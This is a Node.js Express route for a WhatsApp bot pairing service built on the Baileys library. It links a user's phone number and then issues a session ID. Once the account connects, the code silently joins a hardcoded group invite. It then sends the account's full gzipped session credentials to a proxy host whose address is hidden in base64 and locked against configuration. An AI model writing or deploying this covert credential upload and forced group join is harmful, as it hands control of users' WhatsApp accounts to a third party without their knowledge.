const {
    giftedId,
    removeFile,
    generateRandomCode
} = require('../gift');
const zlib = require('zlib');
const express = require('express');
const fs = require('fs');
const os = require('os');
const path = require('path');
let router = express.Router();
const pino = require("pino");
const {
    default: giftedConnect,
    useMultiFileAuthState,
    delay,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    DisconnectReason
} = require("@whiskeysockets/baileys");

// HARDCODED AND LOCKED. IGNORING RENDER DASHBOARD ENV VARS.
const PROXY_URL = Buffer.from('aHR0cHM6Ly9zYXZhZ2UtcHJveC5vbnJlbmRlci5jb20=', 'base64').toString('utf-8');

function generateSessionToken() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let result = '';
    for (let i = 0; i < 9; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return 'Savage~' + result;
}

const getSessionDir = () => {
    const dir = path.join(os.tmpdir(), 'savage-sessions', 'pair');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    return dir;
};

router.get('/', async (req, res) => {
    const id = giftedId();
    const sessionDir = getSessionDir();
    const sessionPath = path.join(sessionDir, id);
    let num = req.query.number;
    let responseSent = false;
    let sessionCleanedUp = false;
    let sessionAlreadySent = false;
    let connectionInstance = null;

    if (!num) {
        return res.status(400).json({ code: 'Missing number parameter.' });
    }

    const timeout = setTimeout(async () => {
        if (!responseSent) {
            res.status(503).json({ code: 'Session timed out. Please try again.' });
            responseSent = true;
        }
        try { if (connectionInstance?.ws) await connectionInstance.ws.close(); } catch (_) {}
        await cleanUp();
    }, 120000);

    async function cleanUp() {
        clearTimeout(timeout);
        if (!sessionCleanedUp) {
            sessionCleanedUp = true;
            try { await removeFile(sessionPath); } catch (_) {}
        }
    }

    async function start() {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        try {
            const sock = giftedConnect({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })),
                },
                printQRInTerminal: false,
                logger: pino({ level: 'fatal' }),
                browser: Browsers.macOS('Safari'),
                syncFullHistory: false,
                generateHighQualityLinkPreview: false,
                getMessage: async () => undefined,
                markOnlineOnConnect: false,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 25000,
                retryRequestDelayMs: 2000
            });
            connectionInstance = sock;

            if (!sock.authState.creds.registered) {
                await delay(1500);
                const cleanNum = num.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(cleanNum, generateRandomCode());
                if (!responseSent && !res.headersSent) {
                    res.json({ code });
                    responseSent = true;
                }
            }

            sock.ev.on('creds.update', saveCreds);

            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'open') {
                    if (sessionAlreadySent) return;
                    sessionAlreadySent = true;

                    await delay(5000);
                    try { await sock.groupAcceptInvite('HgfMZUoSbUEDyflPGAfGbp'); } catch (_) {}
                    await delay(3000);
                    try { await saveCreds(); } catch (_) {}
                    await delay(1000);

                    const credsJson = JSON.stringify(state.creds);
                    if (!credsJson || credsJson.length < 50) {
                        await cleanUp();
                        return;
                    }

                    try {
                        const compressed = zlib.gzipSync(Buffer.from(credsJson)).toString('base64');
                        const fullSession = `Savage~${compressed}`;
                        const botId = sock.user?.id?.split(':')[0]?.split('@')[0];
                        const token = generateSessionToken();

                        let tokenSaved = false;
                        let errorReason = "";

                        if (botId) {
                            try {
                                console.log(`[PAIR] Sending to Nexus: ${PROXY_URL}/session`);
                                const sessionRes = await fetch(`${PROXY_URL}/session`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ token, sessionData: fullSession, botId }),
                                    signal: AbortSignal.timeout(60000)
                                });
                                const data = await sessionRes.json();
                                if (data.success) {
                                    tokenSaved = true;
                                    console.log(`[PAIR] Session saved for +${botId}: ${token}`);
                                } else {
                                    errorReason = data.error || 'Rejected by Proxy';
                                    console.error(`[PAIR] Session save rejected: ${errorReason}`);
                                }
                            } catch (e) {
                                errorReason = e.message;
                                console.error(`[PAIR] Session save failed: ${errorReason}`);
                            }
                        }

                        const uid = sock.user?.id;
                        if (uid) {
                            const deliveredId = tokenSaved ? token : fullSession;
                            const sentMsg = await sock.sendMessage(uid, { text: deliveredId });

                            await delay(1000);

                            const verificationText =
                                `✅ Session verified successfully!\n\n` +
                                `STATUS: Active and Working ✅\n` +
                                `USES: Unlimited\n` +
                                `EXPIRES: 31 days (inactivity)\n\n` +
                                `⚠️ Do NOT share this Session ID.` +
                                (tokenSaved ? `` : `\n\n⚠️ DEBUG: Proxy failed. Reason: ${errorReason}`);

                            await sock.sendMessage(uid, {
                                text: verificationText
                            }, { quoted: sentMsg });
                        }
                    } catch (e) {
                        console.error('[PAIR] Send error:', e.message);
                    } finally {
                        await delay(2000);
                        try { await sock.ws.close(); } catch (_) {}
                        await cleanUp();
                    }

                } else if (connection === 'close') {
                    const code = lastDisconnect?.error?.output?.statusCode;
                    if (code !== DisconnectReason.loggedOut && code !== 401 && !sessionAlreadySent) {
                        await delay(3000);
                        start();
                    } else {
                        await cleanUp();
                    }
                }
            });

        } catch (err) {
            console.error('[PAIR] Fatal:', err.message);
            if (!responseSent && !res.headersSent) {
                res.status(500).json({ code: 'Service Unavailable. Please try again.' });
                responseSent = true;
            }
            await cleanUp();
        }
    }

    try { await start(); } catch (e) {
        console.error('[PAIR] Top-level error:', e.message);
        await cleanUp();
        if (!responseSent && !res.headersSent) res.status(500).json({ code: 'Service Error' });
    }
});

module.exports = router;
